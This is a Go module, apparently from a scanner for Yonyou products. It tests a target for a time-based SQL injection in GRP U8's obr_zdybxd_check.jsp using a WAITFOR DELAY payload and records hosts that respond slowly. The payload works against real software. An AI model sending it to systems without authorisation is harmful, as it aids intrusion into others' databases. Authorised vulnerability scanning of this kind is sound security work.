package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func Obr_zdybxd_checkScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	Obr_zdybxd_check := "用友 GRP U8 obr_zdybxd_check.jsp SQL注入漏洞"
	urls := address + "/u8qx/obr_zdybxd_check.jsp?mlid=1%27;WAITFOR%20DELAY%20%270:0:5%27--"

	startTime := time.Now()

	response, err := client.Get(urls)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, Obr_zdybxd_check)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, Obr_zdybxd_check)
		}
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应失败: %v", Cyan, currentTime, Reset, Yellow, Reset, Obr_zdybxd_check, err)
		fmt.Println(output)
		return
	}

	elapsedTime := time.Since(startTime)

	if strings.Contains(string(body), "1") && elapsedTime.Seconds() > 4 {
		result := Obr_zdybxd_check + "：" + urls
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Green, currentTime, Reset, Green, Reset, Obr_zdybxd_check, urls)
		fmt.Println(output)

		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		if err := Utils.SaveResultToFile(result, filename); err != nil {
			log.Printf("保存结果到文件出错: %v", err)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, Obr_zdybxd_check, response.StatusCode)
		fmt.Println(output)
	}
}
